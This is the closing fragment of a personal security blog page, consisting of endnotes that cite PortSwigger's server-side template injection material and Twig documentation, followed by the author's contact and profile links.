    <li id="fn:1" role="doc-endnote">
      <p><a href="https://www.flaticon.com/free-icon/virus_2115931">Icon</a> made by <a href="https://www.flaticon.com/authors/freepik">Freepik</a> from <a href="https://www.flaticon.com">www.flaticon.com</a>.¬†<a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p><a href="https://portswigger.net/web-security/server-side-template-injection">Server-side template injection | Web Security Academy</a>¬†<a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p><a href="https://twig.symfony.com/doc/">Twig Documentation</a>¬†<a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:4" role="doc-endnote">
      <p><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting#constructing-a-custom-exploit-using-developer-supplied-objects">Constructing a custom exploit using developer-supplied objects</a>¬†<a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

</article>

        </section>
      </div>
    </div>

     
  
    <footer class="site-footer">
  <div class="row">
    <div class="footer-wrapper">
      <div class="footer-col-social col-5 col-s-4">
        <ul>
  
    <li class="social-media-list">
      <a title="Email Address" href="mailto:nima@nima.ninja"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 12.713l-11.985-9.713h23.971l-11.986 9.713zm-5.425-1.822l-6.575-5.329v12.501l6.575-7.172zm10.85 0l6.575 7.172v-12.501l-6.575 5.329zm-1.557 1.261l-3.868 3.135-3.868-3.135-8.11 8.848h23.956l-8.11-8.848z"/></svg>
</span><span>nima@nima.ninja</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a title="GitHub Profile" href="https://github.com/cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a title="X Profile" href="https://x.com/cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="24px" height="24px" clip-rule="evenodd" baseProfile="basic"><polygon fill="#616161" points="41,6 9.929,42 6.215,42 37.287,6"/><polygon fill="#fff" fill-rule="evenodd" points="31.143,41 7.82,7 16.777,7 40.1,41" clip-rule="evenodd"/><path fill="#616161" d="M15.724,9l20.578,30h-4.106L11.618,9H15.724 M17.304,6H5.922l24.694,36h11.382L17.304,6L17.304,6z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a rel="me" title="Mastodon Profile" href="https://infosec.exchange/@cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.327 8.566c0-4.339-2.843-5.61-2.843-5.61-1.433-.658-3.894-.935-6.451-.956h-.063c-2.557.021-5.016.298-6.45.956 0 0-2.843 1.272-2.843 5.61 0 .993-.019 2.181.012 3.441.103 4.243.778 8.425 4.701 9.463 1.809.479 3.362.579 4.612.51 2.268-.126 3.541-.809 3.541-.809l-.075-1.646s-1.621.511-3.441.449c-1.804-.062-3.707-.194-3.999-2.409a4.523 4.523 0 0 1-.04-.621s1.77.433 4.014.536c1.372.063 2.658-.08 3.965-.236 2.506-.299 4.688-1.843 4.962-3.254.434-2.223.398-5.424.398-5.424zm-3.353 5.59h-2.081V9.057c0-1.075-.452-1.62-1.357-1.62-1 0-1.501.647-1.501 1.927v2.791h-2.069V9.364c0-1.28-.501-1.927-1.502-1.927-.905 0-1.357.546-1.357 1.62v5.099H6.026V8.903c0-1.074.273-1.927.823-2.558.566-.631 1.307-.955 2.228-.955 1.065 0 1.872.409 2.405 1.228l.518.869.519-.869c.533-.819 1.34-1.228 2.405-1.228.92 0 1.662.324 2.228.955.549.631.822 1.484.822 2.558v5.253z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  


  <!--
    <li class="social-media-list">
      <a title="Discord Server" href="https://discord.gg/4btHxXWwgQ"><span class="icon"><?xml version="1.0" ?><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title/><path d="M20.222 0c1.406 0 2.54 1.137 2.607 2.475V24l-2.677-2.273-1.47-1.338-1.604-1.398.67 2.205H3.71c-1.402 0-2.54-1.065-2.54-2.476V2.48C1.17 1.142 2.31.003 3.715.003h16.5L20.222 0zm-6.118 5.683h-.03l-.202.2c2.073.6 3.076 1.537 3.076 1.537-1.336-.668-2.54-1.002-3.744-1.137-.87-.135-1.74-.064-2.475 0h-.2c-.47 0-1.47.2-2.81.735-.467.203-.735.336-.735.336s1.002-1.002 3.21-1.537l-.135-.135s-1.672-.064-3.477 1.27c0 0-1.805 3.144-1.805 7.02 0 0 1 1.74 3.743 1.806 0 0 .4-.533.805-1.002-1.54-.468-2.14-1.404-2.14-1.404s.134.066.335.2h.06c.03 0 .044.015.06.03v.006c.016.016.03.03.06.03.33.136.66.27.93.4.466.202 1.065.403 1.8.536.93.135 1.996.2 3.21 0 .6-.135 1.2-.267 1.8-.535.39-.2.87-.4 1.397-.737 0 0-.6.936-2.205 1.404.33.466.795 1 .795 1 2.744-.06 3.81-1.8 3.87-1.726 0-3.87-1.815-7.02-1.815-7.02-1.635-1.214-3.165-1.26-3.435-1.26l.056-.02zm.168 4.413c.703 0 1.27.6 1.27 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334.002-.74.573-1.338 1.27-1.338zm-4.543 0c.7 0 1.266.6 1.266 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334 0-.74.57-1.338 1.27-1.338z"/></svg>
</span><span>Legendary NOoBs</span></a>
    </li>
  -->

  
    <li class="social-media-list">
      <a title="PGP Key" href="/assets/CEE9A66A2F5C6187E4242B0425669795B037FEF2.asc.txt"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.451 17.337l-2.451 2.663h-2v2h-2v2h-6v-5l6.865-6.949c1.08 2.424 3.095 4.336 5.586 5.286zm11.549-9.337c0 4.418-3.582 8-8 8s-8-3.582-8-8 3.582-8 8-8 8 3.582 8 8zm-3-3c0-1.104-.896-2-2-2s-2 .896-2 2 .896 2 2 2 2-.896 2-2z"/></svg>
</span><span>pgp key</span></a>
    </li>
  

  <li class="social-media-list">
    <a title="RSS Feed" href="/feed.xml"><span class="icon-nofill"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#ee802f" d="M6.503 20.752c0 1.794-1.456 3.248-3.251 3.248-1.796 0-3.252-1.454-3.252-3.248 0-1.794 1.456-3.248 3.252-3.248 1.795.001 3.251 1.454 3.251 3.248zm-6.503-12.572v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817c-.062-8.71-7.118-15.758-15.839-15.82zm0-3.368c10.58.046 19.152 8.594 19.183 19.188h4.817c-.03-13.231-10.755-23.954-24-24v4.812z"/></svg>
</span><span>rss</span></a>
  </li>
</ul>

      </div>
      <div class="footer-col-badges col-3 col-s-5">
        <ul>
  
    <li class="social-media-list">
      <a title="Hack The Box Profile" href="https://app.hackthebox.com/profile/768488"><img src="https://www.hackthebox.eu/badge/image/768488" alt="Hack The Box"></a>
    </li>
  

  
    <li class="social-media-list">
      <a title="TryHackMe Profile" href="https://tryhackme.com/p/nima"><img src="https://tryhackme-badges.s3.amazonaws.com/nima.png" alt="TryHackMe"></a>
    </li>
  
</ul>


      </div>
      <div class="footer-col-copyright col-10 col-s-10">
        <a href="http://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
          <span>
              <b>Nima</b>
          </span>
          
          <span>¬© 2024</span>
        </a>
      </div>
    </div>
  </div>
</footer>


    
  </body>
</html>
